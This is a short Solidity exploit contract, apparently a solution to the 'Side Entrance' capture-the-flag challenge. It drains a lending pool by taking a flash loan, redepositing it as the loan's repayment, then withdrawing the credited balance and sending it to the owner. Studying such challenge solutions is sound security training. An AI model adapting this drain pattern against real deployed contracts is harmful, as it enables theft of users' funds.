// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";

contract Attack1 is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    address owner;

    constructor(SideEntranceLenderPool _target) {
        pool = _target;
        owner = msg.sender;
    }
    receive() external payable{}

    function execute() public payable override {
        pool.deposit{value: address(this).balance}();
    }

    function hack() public payable {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        (bool success,) = payable(owner).call{value: address(this).balance}("");
        if (!success) {
            revert("transfer failed");
        }
    }
}
 